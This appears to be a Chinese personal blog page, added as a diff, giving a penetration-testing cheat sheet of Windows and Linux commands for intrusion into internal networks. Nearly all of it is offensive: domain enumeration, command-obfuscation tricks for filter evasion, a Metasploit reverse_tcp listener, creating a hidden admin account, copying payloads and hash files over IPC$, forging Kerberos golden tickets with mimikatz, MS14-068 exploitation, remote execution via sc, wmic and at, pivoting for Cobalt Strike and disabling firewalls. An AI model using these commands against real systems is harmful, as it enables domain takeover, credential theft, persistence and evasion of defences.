@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 6.2.0">
+
+  
+
+  
+
+  
+    <meta name="author" content="E-Maker">
+  
+
+  
+
+  
+
+  <title>渗透常用小命令 | E-Maker&#39;s Home</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/imemaker/imemaker.github.io/favicon.ico">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/monokai.css">
+  
+
+  
+<link rel="stylesheet" href="/imemaker/imemaker.github.io/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://emakerx.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fcc2d1ee3-d1c1-43b6-b2eb-d778332da325%2F1.jpg?table=block&amp;id=a9b668c7-b8b8-47a7-a1a0-9cece0c787b9&amp;spaceId=d7e178a2-4e91-41b3-a44b-6d87daef74c0&amp;width=2000&amp;userId=&amp;cache=v2)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/imemaker/imemaker.github.io/">
+        
+          E-Maker&#39;s Home
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/imemaker/imemaker.github.io/">首页</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">渗透常用小命令</h1>
+          <h2 class="title-sub-wrap">
+            <strong>E-Maker</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2021-06-12T12:24:39.000Z" itemprop="datePublished">2021-06-12</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/imemaker/imemaker.github.io/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/">📒 技术博客</a></li>
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">🏷️ 渗透测试</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/ms14-068/">🏷️ ms14-068</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/">🏷️ 黄金票据</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/RCE/">🏷️ RCE</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/%E5%86%85%E7%BD%91%E5%A4%9A%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/">🏷️ 内网多层网络代理</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1/">🏷️ 内网服务</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/windows-linux%E9%98%B2%E7%81%AB%E5%A2%99/">🏷️ windows/linux防火墙</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/MSF/">🏷️ MSF</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/CobaltStrike/">🏷️ CobaltStrike</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">🏷️ windows命令执行</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="查看内网相关信息"><a href="#查看内网相关信息" class="headerlink" title="查看内网相关信息"></a>查看内网相关信息</h2><ul>
+<li><p>查看远程主机进程</p>
+<blockquote>
+<ul>
+<li><code>tasklist /s 10.10.10.10 /u administrator /p 1qaz@WSX</code></li>
+</ul>
+</blockquote>
+</li>
+<li><p>内网其他主机名称(基于netbios)</p>
+<blockquote>
+<ul>
+<li><code>nbtstat -A ip</code></li>
+</ul>
+</blockquote>
+</li>
+<li><p>查看当前已登录用户(登录3389会挤掉已登录用户，所以拿到3389账号后先查看已登录用户再决定是否3389上去)</p>
+<blockquote>
+<ul>
+<li><code>query user</code></li>
+</ul>
+</blockquote>
+</li>
+<li><p>获取域用户列表</p>
+<blockquote>
+<ul>
+<li><code>net user /domain</code></li>
+</ul>
+</blockquote>
+</li>
+<li><p>获取域管理员列表</p>
+<blockquote>
+<ul>
+<li><code>net group &quot;domain admins&quot; /domain</code></li>
+</ul>
+</blockquote>
+</li>
+<li><p>获取域控制器列表</p>
+<blockquote>
+<ul>
+<li><code>net group &quot;domain controllers&quot; /domain</code></li>
+</ul>
+</blockquote>
+</li>
+<li><p>查看域内机器</p>
+<blockquote>
+<ul>
+<li><code>net group &quot;domain cpmputers&quot; /domain</code></li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<h2 id="windows命令执行"><a href="#windows命令执行" class="headerlink" title="windows命令执行"></a>windows命令执行</h2><ul>
+<li>设置环境变量<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set a=&quot;cmd /c whoami&quot;&amp;&amp;%a%</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>双引号<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">who&quot;&quot;am&quot;&quot;i</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>转义符(^)<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">who^am^i</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>逗号、分号代替空格<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd,/c,whoami</span><br><span class="line">cmd;/c;whoami</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+</ul>
+<h2 id="MSF快捷开启监听"><a href="#MSF快捷开启监听" class="headerlink" title="MSF快捷开启监听"></a>MSF快捷开启监听</h2><blockquote>
+<ul>
+<li><code>handler -p windows/meterpreter/reverse_tcp -P 8080 -H 192.168.1.1</code></li>
+</ul>
+</blockquote>
+<h2 id="windows中文乱码"><a href="#windows中文乱码" class="headerlink" title="windows中文乱码"></a>windows中文乱码</h2><blockquote>
+<ul>
+<li><code>chcp 65001</code></li>
+</ul>
+</blockquote>
+<h2 id="添加可3389用户"><a href="#添加可3389用户" class="headerlink" title="添加可3389用户"></a>添加可3389用户</h2><blockquote>
+<ul>
+<li><code>net user test$ password /add</code></li>
+<li><code>net localgroup administrators test$ /add</code></li>
+</ul>
+</blockquote>
+<h2 id="IPC连接"><a href="#IPC连接" class="headerlink" title="IPC连接"></a>IPC连接</h2><ul>
+<li>建立IPC连接<code>net use \\ip\ipc$ password /user:username</code></li>
+<li>复制本地文件到目标服务器 <code>copy hacker.exe \\ip\C$\windows\temp</code></li>
+<li>复制目标服务器文件到本地 <code>copy \\ip\C$\windows\temp\hash.txt</code></li>
+<li>常见的连接错误编号及错误原因<table>
+<thead>
+<tr>
+<th align="center">编号</th>
+<th align="center">原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">5</td>
+<td align="center">拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限</td>
+</tr>
+<tr>
+<td align="center">51</td>
+<td align="center"><code>Windows</code>无法找到网络路径：网络有问题</td>
+</tr>
+<tr>
+<td align="center">53</td>
+<td align="center">找不到网络路径：ip地址错误；目标未开机；目标<code>lanmanserver</code>服务未启动；目标有防火墙（端口过滤）</td>
+</tr>
+<tr>
+<td align="center">67</td>
+<td align="center">找不到网络名：你的<code>lanmanworkstation</code>服务未启动；目标删除了<code>ipc$</code></td>
+</tr>
+<tr>
+<td align="center">1219</td>
+<td align="center">提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连</td>
+</tr>
+<tr>
+<td align="center">1326</td>
+<td align="center">未知的用户名或错误密码：原因很明显了</td>
+</tr>
+<tr>
+<td align="center">1792</td>
+<td align="center">试图登录，但是网络登录服务没有启动：目标<code>NetLogon</code>服务未启动。（连接域控会出现此情况）</td>
+</tr>
+<tr>
+<td align="center">2242</td>
+<td align="center">此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="查看krbtgt相关信息"><a href="#查看krbtgt相关信息" class="headerlink" title="查看krbtgt相关信息"></a>查看krbtgt相关信息</h3><ul>
+<li><code>mimikatz lsadump::dcsync /domain:de1ay.com /user:krbtgt</code><h3 id="需要的信息"><a href="#需要的信息" class="headerlink" title="需要的信息"></a>需要的信息</h3></li>
+<li>域内用户</li>
+<li>该用户的域sid</li>
+<li>域名</li>
+<li>krbtgt ntlm hash</li>
+</ul>
+<h3 id="制作"><a href="#制作" class="headerlink" title="制作"></a>制作</h3><ul>
+<li>右键目标-&gt;<code>access</code>-&gt;<code>golden ticket</code>（CS）</li>
+<li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:test.com /sid:S-1-5-21-3298638106-3321833000-1571791979 /krbtgt:0199f7c89b9d5262c897e0d1bf858bfb /user:administrator /ticket:ntlm.kirbi</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="黄金票据的用途-x3D-gt-权限维持"><a href="#黄金票据的用途-x3D-gt-权限维持" class="headerlink" title="黄金票据的用途&#x3D;&gt;权限维持"></a>黄金票据的用途&#x3D;&gt;权限维持</h3><ul>
+<li>把域内普通用户提升为域管理员，相当于通过域控在域内留了一个特殊的后门</li>
+</ul>
+<h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><blockquote>
+<p>这里注意，在成功后，使用<code>DC</code>的<code>IP</code>地址进行访问时，还是不可访问的，是因为使用<code>ip</code>地址进行<code>ipc</code>连接时，采用的认证协议为<code>NTLM</code>协议；使用<code>DC</code>的主机名访问可以成功，是因为使用主机名进行<code>ipc</code>连接时，采用的认证协议为<code>kerberos</code>协议。也就是说，账密、<code>hash</code>等采用的是<code>NTLM</code>协议；<code>ticket</code>等票据采用的是<code>kerberos</code>协议</p>
+</blockquote>
+<ul>
+<li>补丁号：<code>KB3011780</code>(<code>systeminfo|findstr 3011780</code>)</li>
+<li>域用户账号、密码、域用户sid、域名</li>
+<li><code>C:\ms14-068.exe -u username@test.org -p password -s sid -d DC.test.org</code></li>
+<li><code>mimikatz kerberos::purge</code></li>
+<li><code>mimikatz kerberos::ptc ***.ccache</code></li>
+</ul>
+<h2 id="windows中copy与xcopy"><a href="#windows中copy与xcopy" class="headerlink" title="windows中copy与xcopy"></a>windows中copy与xcopy</h2><ul>
+<li>copy只能拷贝到根目录，不能拷贝到子目录；xcopy能<blockquote>
+<ul>
+<li>copy C:&#x2F;1.exe C:&#x2F;user&#x2F;1.exe（N）</li>
+<li>xcopy C:&#x2F;1.exe C:&#x2F;user&#x2F;1.exe（Y）</li>
+</ul>
+</blockquote>
+</li>
+<li>copy可以把两个文件合二为一，如图片马制作；xcopy不能</li>
+</ul>
+<h2 id="windows白名单"><a href="#windows白名单" class="headerlink" title="windows白名单"></a>windows白名单</h2><h3 id="windows-sc"><a href="#windows-sc" class="headerlink" title="windows sc"></a>windows sc</h3><ul>
+<li>创建任务：(注意等号后面空格不能省略、本地创建去掉<code>\\rhostname</code>即可)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\rhostname create name binpath= &quot;exepath&quot;</span><br></pre></td></tr></table></figure></li>
+<li>启动任务：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\rhostname start name</span><br></pre></td></tr></table></figure></li>
+<li>删除任务：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\rhostname delete name</span><br></pre></td></tr></table></figure></li>
+<li>查看任务：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\rhostname query name</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="windows-wmic"><a href="#windows-wmic" class="headerlink" title="windows wmic"></a>windows wmic</h3><ul>
+<li>创建进程：<blockquote>
+<ul>
+<li>本地：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process call create &quot;C:\Program Files\Tencent\QQ\QQ.exe&quot;</span><br></pre></td></tr></table></figure></li>
+<li>远程：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.*.* /user:administrator /password:123456 process call create cmd.exe</span><br></pre></td></tr></table></figure></li>
+</ul>
+</blockquote>
+</li>
+<li>删除进程：<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where name=&quot;qq.exe&quot; call terminate</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where name=&quot;qq.exe&quot; delete</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where pid=&quot;123&quot; delete</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>全盘搜索文件<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;skip=1 tokens=1*&quot; %i in (&#x27;wmic datafile where &quot;FileName=&#x27;qq&#x27; and extension=&#x27;exe&#x27;&quot; get drive^,path&#x27;) do (set &quot;qPath=%i%j&quot;&amp;@echo %qPath:~0,-3%)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="windows-at"><a href="#windows-at" class="headerlink" title="windows at"></a>windows at</h3></li>
+<li>查看远程主机时间<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\ip</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>创建计划任务<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\ip 15:00:00 cmd /c &quot;C:\1.exe&quot;</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>删除计划任务<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\ip id /delete</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>查看计划任务<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+</ul>
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><h3 id="内网场景"><a href="#内网场景" class="headerlink" title="内网场景"></a>内网场景</h3><table>
+<thead>
+<tr>
+<th align="center">场景</th>
+<th align="center">跳板机</th>
+<th align="center">内网机</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">windows</td>
+<td align="center">linux</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">windows</td>
+<td align="center">windows</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">linux</td>
+<td align="center">linux</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">linux</td>
+<td align="center">windows</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>场景1、2、3，无论是<code>msf</code>还是<code>cs</code>，都可以很简单地解决，以下叙述方法主要用于解决<code>cs</code>的场景4</p>
+</blockquote>
+<p><img src="https://emakerx.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9e2ee7dd-b91f-44ff-9347-d5e88aa54e1d%2F1.png?table=block&id=6bc418d2-6769-4e42-a73b-145b6088186b&spaceId=d7e178a2-4e91-41b3-a44b-6d87daef74c0&width=980&userId=&cache=v2"></p>
+<ul>
+<li>proxy<blockquote>
+<p>该工具在指定端口开启代理服务，用于流量代理<br><code>proxy http -t tcp -p &quot;0.0.0.0:38080&quot; --daemon</code></p>
+</blockquote>
+<h3 id="windows（netsh）"><a href="#windows（netsh）" class="headerlink" title="windows（netsh）"></a>windows（netsh）</h3></li>
+<li>增加一条规则<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=port(随意、cs监听代理端口) listenaddress=ip(内网ip) connectport=38080(对应上面的proxy工具开启端口) connectaddress=ip(外网ip)</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>删掉一条规则<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenport=8933 listenaddress=ip connectport=3389 connectaddress=ip</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>关闭防火墙<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>开启防火墙<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state on</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="linux（iptables）"><a href="#linux（iptables）" class="headerlink" title="linux（iptables）"></a>linux（iptables）</h3></li>
+<li>查看是否开启转发<blockquote>
+<p><code>vi /etc/sysctl.conf</code></p>
+</blockquote>
+</li>
+<li>开启转发功能<blockquote>
+<p><code>sysctl -w net.ipv4.ip_forward=1</code></p>
+</blockquote>
+</li>
+<li>增加一条规则（跳板机内网卡流量转发外网卡）<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 7777(随意、cs监听代理端口) -j DNAT --to-destination ip(外网ip):38080(proxy工具端口)</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>查看存在的规则<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -nL</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+</ul>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+      <div class="card-cover" background-image-lazy data-img="https://emakerx.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fcac163e7-7c23-4c15-9378-c84286ae9a5d%2F5.jpg?table=block&amp;id=40adb1d1-9da0-4727-bdb4-fa2ec9adec7a&amp;spaceId=d7e178a2-4e91-41b3-a44b-6d87daef74c0&amp;width=2000&amp;userId=&amp;cache=v2"></div>
+    
+    <div class="card-text">
+      
+        <a href="/imemaker/imemaker.github.io/2021/06/14/VulnStack-1/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">VulnStack 1</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+      <div class="card-cover" background-image-lazy data-img="https://emakerx.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3c6375d8-47da-4a69-a2e9-de3a9d9c1cca%2F4.jpg?table=block&amp;id=d39c2685-47de-4c60-92ac-d25149dee784&amp;spaceId=d7e178a2-4e91-41b3-a44b-6d87daef74c0&amp;width=2000&amp;userId=&amp;cache=v2"></div>
+    
+    <div class="card-text">
+      
+        <a href="/imemaker/imemaker.github.io/2021/06/12/DNSlog/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">DNSlog</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://s.gravatar.com/avatar/2d6b803eea37de0257620d5fabee7e64?s=200&amp;r=g&amp;d=retro" class="soft-size--round soft-style--box" alt="E-Maker">
+    
+    
+      <h2>E-Maker</h2>
+    
+    
+      <p>一枚小白</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>12</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        3
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        39
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+<section class="widget-toc widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-toc" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M134.50666666 767.46666668H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.23999999v50.13333333c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H134.50666666c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.13333333c0.10666668-27.73333333 22.50666668-50.24000001 50.24000001-50.24000001zM84.37333332 541.65333333h326.18666669c27.73333333 0 50.24000001 22.39999999 50.23999999 50.13333334v50.24000001c0 27.73333333-22.50666668 50.24000001-50.24000002 50.23999999H84.37333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.23999999v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333334zM134.50666666 315.83999999H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.24000001v50.24000001c0 27.73333333-22.50666668 50.13333334-50.24000001 50.13333333H134.50666666c-27.73333333 0-50.24000001-22.39999999-50.23999999-50.13333333v-50.24000001c0.10666668-27.84000001 22.50666668-50.24000001 50.24000001-50.23999999zM209.81333332 89.91999999h326.18666671c27.73333333 0 50.24000001 22.39999999 50.23999997 50.13333335v50.23999999c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H209.81333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333333zM692.05333333 623.36l274.66666669 176.00000002c23.36000001 14.93333333 30.08 45.97333334 15.14666666 69.33333332L954.77333334 910.93333333c-14.93333333 23.25333334-45.97333334 30.08-69.33333335 15.14666667l-274.66666666-176c-23.36000001-14.93333333-30.08-45.97333334-15.14666667-69.33333333l27.09333334-42.24000001c14.93333333-23.36000001 46.08000001-30.08 69.33333333-15.14666666z" fill="currentColor"></path>
+</svg>
+    <span>TOC</span>
+  </div>
+  <div class="widget-body">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%86%85%E7%BD%91%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">查看内网相关信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">windows命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E5%BF%AB%E6%8D%B7%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC"><span class="toc-number">3.</span> <span class="toc-text">MSF快捷开启监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81"><span class="toc-number">4.</span> <span class="toc-text">windows中文乱码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%8F%AF3389%E7%94%A8%E6%88%B7"><span class="toc-number">5.</span> <span class="toc-text">添加可3389用户</span></a></li><li class="toc-item toc-level-2"><a 